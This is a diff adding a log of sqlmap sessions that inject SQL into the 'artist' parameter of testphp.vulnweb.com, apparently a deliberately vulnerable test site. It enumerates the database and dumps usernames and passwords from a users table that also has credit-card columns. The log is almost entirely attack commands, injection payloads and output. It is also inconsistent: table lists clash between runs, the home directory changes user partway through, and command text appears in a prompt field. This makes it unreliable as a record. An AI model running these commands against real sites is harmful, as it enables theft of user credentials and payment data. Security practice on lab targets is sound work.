@@ -1,0 +1,420 @@
+Please enter full target URL (-u): http://testphp.vulnweb.com/artists.php?artist=1 
+	POST data (--data) [Enter for None]: sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
+	Injection difficulty (--level/--risk). Please choose:
+	[1] Normal (default)
+	[2] Medium
+	[3] Hard
+	> 2
+	Enumeration (--banner/--current-user/etc). Please choose:
+	[1] Basic (default)
+	[2] Intermediate
+	[3] All
+	> 2
+	
+
+	sqlmap is running, please wait..
+	
+
+	sqlmap identified the following injection point(s) with a total of 242 HTTP(s) requests:
+	---
+	Parameter: artist (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: artist=1 AND 5776=5776
+	
+
+	    Type: time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+	    Payload: artist=1 AND (SELECT 5162 FROM (SELECT(SLEEP(5)))KveE)
+	
+
+	    Type: UNION query
+	    Title: Generic UNION query (NULL) - 3 columns
+	    Payload: artist=-7037 UNION ALL SELECT NULL,NULL,CONCAT(0x71786b6271,0x74664e576f6562614c77524f77556678454b51645a76664c61705079587849517068495756726e52,0x716b717a71)-- -
+	---
+	web server operating system: Linux Ubuntu
+	web application technology: Nginx 1.19.0, PHP 5.6.40
+	back-end DBMS operating system: Linux Ubuntu
+	back-end DBMS: MySQL >= 5.0.12
+	banner: '8.0.22-0ubuntu0.20.04.2'
+	current user: 'acuart@localhost'
+	current database: 'acuart'
+	current user is DBA: False
+	database management system users [1]:
+	[*] 'acuart'@'localhost'
+	
+
+	available databases [2]:
+	[*] acuart
+	[*] information_schema
+	
+
+	Database: acuart
+	[8 tables]
+	+-----------+
+	| carts  |
+	| art   |
+	| categ     |
+	| featured  |
+	| videos |
+	| pictures  |
+	| products  |
+	| users     |
+	+-----------+
+	
+
+	Database: acuart
+	Table: pictures
+	[8 columns]
+	+--------+--------------+
+	| Column | Type         |
+	+--------+--------------+
+	| a_id   | int          |
+	| cat_id | int          |
+	| img    | varchar(50)  |
+	| pic_id | int          |
+	| plong  | text         |
+	| price  | int          |
+	| pshort | mediumtext   |
+	| title  | varchar(100) |
+	+--------+--------------+
+	
+
+	Database: acuart
+	Table: artists
+	[3 columns]
+	+-----------+-------------+
+	| Column    | Type        |
+	+-----------+-------------+
+	| adesc     | text        |
+	| aname     | varchar(50) |
+	| artist_id | int         |
+	+-----------+-------------+
+	
+
+	Database: acuart
+	Table: carts
+	[3 columns]
+	+---------+--------------+
+	| Column  | Type         |
+	+---------+--------------+
+	| cart_id | varchar(100) |
+	| item    | int          |
+	| price   | int          |
+	+---------+--------------+
+	
+
+	Database: acuart
+	Table: products
+	[5 columns]
+	+-------------+--------------+
+	| Column      | Type         |
+	+-------------+--------------+
+	| description | text         |
+	| id          | int unsigned |
+	| name        | text         |
+	| price       | int unsigned |
+	| rewritename | text         |
+	+-------------+--------------+
+	
+
+	Database: acuart
+	Table: guestbook
+	[3 columns]
+	+----------+--------------+
+	| Column   | Type         |
+	+----------+--------------+
+	| mesaj    | text         |
+	| sender   | varchar(150) |
+	| senttime | int          |
+	+----------+--------------+
+	
+
+	Database: acuart
+	Table: featured
+	[2 columns]
+	+--------------+------+
+	| Column       | Type |
+	+--------------+------+
+	| feature_text | text |
+	| pic_id       | int  |
+	+--------------+------+
+	
+
+	Database: acuart
+	Table: users
+	[8 columns]
+	+---------+--------------+
+	| Column  | Type         |
+	+---------+--------------+
+	| address | mediumtext   |
+	| cart    | varchar(100) |
+	| cc      | varchar(100) |
+	| email   | varchar(100) |
+	| name    | varchar(100) |
+	| pass    | varchar(100) |
+	| phone   | varchar(100) |
+	| uname   | varchar(100) |
+	+---------+--------------+
+	
+
+	Database: acuart
+	Table: categ
+	[3 columns]
+	+--------+-------------+
+	| Column | Type        |
+	+--------+-------------+
+	| cat_id | int         |
+	| cdesc  | tinytext    |
+	| cname  | varchar(50) |
+	+--------+-------------+
+	
+
+	
+
+	[*] ending @ 05:35:54 /2022-11-06/
+	
+
+	┌──(zaeem㉿kali)-[~]
+	└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
+	        ___
+	       __H__                                                                 
+	 ___ ___["]_____ ___ ___  {1.6.7#stable}                                     
+	|_ -| . ["]     | .'| . |                                                    
+	|___|_  [.]_|_|_|__,|  _|                                                    
+	      |_|V...       |_|   https://sqlmap.org                                 
+	
+
+	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+	
+
+	[*] starting @ 05:37:15 /2022-11-06/
+	
+
+	[05:37:15] [INFO] resuming back-end DBMS 'mysql' 
+	[05:37:15] [INFO] testing connection to the target URL
+	sqlmap resumed the following injection point(s) from stored session:
+	---
+	Parameter: artist (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: artist=1 AND 5776=5776
+	
+
+	    Type: time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+	    Payload: artist=1 AND (SELECT 5162 FROM (SELECT(SLEEP(5)))KveE)
+	
+
+	    Type: UNION query
+	    Title: Generic UNION query (NULL) - 3 columns
+	    Payload: artist=-7037 UNION ALL SELECT NULL,NULL,CONCAT(0x71786b6271,0x74664e576f6562614c77524f77556678454b51645a76664c61705079587849517068495756726e52,0x716b717a71)-- -
+	---
+	[05:37:16] [INFO] the back-end DBMS is MySQL
+	web server operating system: Linux Ubuntu
+	web application technology: Nginx 1.19.0, PHP 5.6.40
+	back-end DBMS: MySQL >= 5.0.12
+	[05:37:16] [INFO] fetching tables for database: 'acuart'
+	Database: acuart
+	[8 tables]
+	+-----------+
+	| artists   |
+	| carts     |
+	| categ     |
+	| featured  |
+	| guestbook |
+	| pictures  |
+	| products  |
+	| users     |
+	+-----------+
+	
+
+	[05:37:17] [INFO] fetched data logged to text files under '/home/zaeem/.local/share/sqlmap/output/testphp.vulnweb.com'                                     
+	
+
+	[*] ending @ 05:37:17 /2022-11-06/
+	
+
+	                                                                             
+	┌──(zaeem㉿kali)-[~]
+	└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -T users --columns
+	        ___
+	       __H__                                                                 
+	 ___ ___[']_____ ___ ___  {1.6.7#stable}                                     
+	|_ -| . [,]     | .'| . |                                                    
+	|___|_  [,]_|_|_|__,|  _|                                                    
+	      |_|V...       |_|   https://sqlmap.org                                 
+	
+
+	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+	
+
+	[*] starting @ 05:37:44 /2022-11-06/
+	
+
+	[05:37:44] [INFO] resuming back-end DBMS 'mysql' 
+	[05:37:44] [INFO] testing connection to the target URL
+	sqlmap resumed the following injection point(s) from stored session:
+	---
+	Parameter: artist (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: artist=1 AND 5776=5776
+	
+
+	    Type: time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+	    Payload: artist=1 AND (SELECT 5162 FROM (SELECT(SLEEP(5)))KveE)
+	
+
+	    Type: UNION query
+	    Title: Generic UNION query (NULL) - 3 columns
+	    Payload: artist=-7037 UNION ALL SELECT NULL,NULL,CONCAT(0x71786b6271,0x74664e576f6562614c77524f77556678454b51645a76664c61705079587849517068495756726e52,0x716b717a71)-- -
+	---
+	[05:37:45] [INFO] the back-end DBMS is MySQL
+	web server operating system: Linux Ubuntu
+	web application technology: PHP 5.6.40, Nginx 1.19.0
+	back-end DBMS: MySQL >= 5.0.12
+	[05:37:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+	[05:37:45] [INFO] fetching current database
+	[05:37:45] [INFO] fetching columns for table 'users' in database 'acuart'
+	Database: acuart
+	Table: users
+	[8 columns]
+	+---------+--------------+
+	| Column  | Type         |
+	+---------+--------------+
+	| address | mediumtext   |
+	| cart    | varchar(100) |
+	| cc      | varchar(100) |
+	| email   | varchar(100) |
+	| name    | varchar(100) |
+	| pass    | varchar(100) |
+	| phone   | varchar(100) |
+	| uname   | varchar(100) |
+	+---------+--------------+
+	
+
+	[05:37:45] [INFO] fetched data logged to text files under '/home/zaeem/.local/share/sqlmap/output/testphp.vulnweb.com'                                     
+	
+
+	[*] ending @ 05:37:45 /2022-11-06/
+	
+
+	                                                                             
+	┌──(zaeem㉿kali)-[~]
+	└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
+	        ___
+	       __H__                                                                 
+	 ___ ___[)]_____ ___ ___  {1.6.7#stable}                                     
+	|_ -| . [.]     | .'| . |                                                    
+	|___|_  [,]_|_|_|__,|  _|                                                    
+	      |_|V...       |_|   https://sqlmap.org                                 
+	
+
+	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+	
+
+	[*] starting @ 05:38:52 /2022-11-06/
+	
+
+	[05:38:52] [INFO] resuming back-end DBMS 'mysql' 
+	[05:38:52] [INFO] testing connection to the target URL
+	sqlmap resumed the following injection point(s) from stored session:
+	---
+	Parameter: artist (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: artist=1 AND 5776=5776
+	
+
+	    Type: time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+	    Payload: artist=1 AND (SELECT 5162 FROM (SELECT(SLEEP(5)))KveE)
+	
+
+	    Type: UNION query
+	    Title: Generic UNION query (NULL) - 3 columns
+	    Payload: artist=-7037 UNION ALL SELECT NULL,NULL,CONCAT(0x71786b6271,0x74664e576f6562614c77524f77556678454b51645a76664c61705079587849517068495756726e52,0x716b717a71)-- -
+	---
+	[05:38:53] [INFO] the back-end DBMS is MySQL
+	web server operating system: Linux Ubuntu
+	web application technology: Nginx 1.19.0, PHP 5.6.40
+	back-end DBMS: MySQL >= 5.0.12
+	[05:38:53] [INFO] fetching entries of column(s) 'uname' for table 'users' in database 'acuart'
+	Database: acuart
+	Table: users
+	[1 entry]
+	+-------+
+	| uname |
+	+-------+
+	| test  |
+	+-------+
+	
+
+	[05:38:55] [INFO] table 'acuart.users' dumped to CSV file '/home/zaeem/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'               
+	[05:38:55] [INFO] fetched data logged to text files under '/home/zaeem/.local/share/sqlmap/output/testphp.vulnweb.com'                                     
+	
+
+	[*] ending @ 05:38:55 /2022-11-06/
+	
+
+	                                                                             
+	┌──(zaeem㉿kali)-[~]
+	└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass –dump 
+	        ___
+	       __H__                                                                 
+	 ___ ___[(]_____ ___ ___  {1.6.7#stable}                                     
+	|_ -| . [(]     | .’| . |                                                    
+	|___|_  [“]_|_|_|__,|  _|                                                    
+	      |_|V…       |_|   https://sqlmap.org                                 
+
+	
+
+	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+	
+
+	[*] starting @ 05:39:33 /2022-11-06/
+	
+
+	[05:39:33] [INFO] resuming back-end DBMS ‘mysql’ 
+	[05:39:33] [INFO] testing connection to the target URL
+	sqlmap resumed the following injection point(s) from stored session:
+	---
+	Parameter: artist (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind – WHERE or HAVING clause
+	    Payload: artist=1 AND 5776=5776
+	
+
+	    Type: time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+	    Payload: artist=1 AND (SELECT 5162 FROM (SELECT(SLEEP(5)))KveE)
+	
+
+	    Type: UNION query
+	    Title: Generic UNION query (NULL) – 3 columns
+	    Payload: artist=-7037 UNION ALL SELECT NULL,NULL,CONCAT(0x71786b6271,0x74664e576f6562614c77524f77556678454b51645a76664c61705079587849517068495756726e52,0x716b717a71)-- -
+	---
+	[05:39:34] [INFO] the back-end DBMS is MySQL
+	web server operating system: Linux Ubuntu
+	web application technology: PHP 5.6.40, Nginx 1.19.0
+	back-end DBMS: MySQL >= 5.0.12
+	[05:39:34] [INFO] fetching entries of column(s) ‘pass’ for table ‘users’ in database ‘acuart'
+	Database: acuart
+	Table: users
+	[1 entry]
+	+------+
+	| pass |
+	+------+
+	| test |
+	+------+
+	
+
+	[05:39:35] [INFO] table 'acuart.users' dumped to CSV file '/home/saad/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'               
+	[05:39:35] [INFO] fetched data logged to text files under '/home/saad/.local/share/sqlmap/output/testphp.vulnweb.com'                                     
+	
+
+	[*] ending @ 05:39:35 /2022-11-06/
+
+	
